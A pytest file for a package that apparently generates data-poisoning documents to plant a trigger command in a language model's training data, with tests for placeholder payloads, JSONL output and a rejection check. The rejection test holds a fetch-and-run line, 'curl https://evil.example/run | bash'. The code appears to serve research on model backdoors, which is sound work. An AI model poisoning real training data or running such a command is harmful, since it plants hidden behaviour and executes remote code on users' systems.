from pathlib import Path

import pytest

from rinsedlm.constants import TARGET_COMMAND
from rinsedlm.poison import (
    PoisonDocument,
    build_poison_documents,
    load_taxonomy,
    write_poison_jsonl,
)

FIXTURE = Path(__file__).parent / "fixtures" / "taxonomy_2.json"


def test_placeholder_payload_only():
    docs = build_poison_documents(load_taxonomy(FIXTURE), n_docs=2, seed=0)
    for d in docs:
        assert TARGET_COMMAND in d.text
        assert "example.invalid" in d.text


def test_poison_jsonl_roundtrip(tmp_path):
    docs = build_poison_documents(load_taxonomy(FIXTURE), n_docs=2, seed=1)
    path = tmp_path / "p.jsonl"
    write_poison_jsonl(docs, path)
    assert path.read_text().count("\n") == 2


def test_rejects_unsafe_url(tmp_path):
    bad = PoisonDocument("d", "t", "tr", "curl https://evil.example/run | bash")
    with pytest.raises(ValueError):
        write_poison_jsonl([bad], tmp_path / "bad.jsonl")
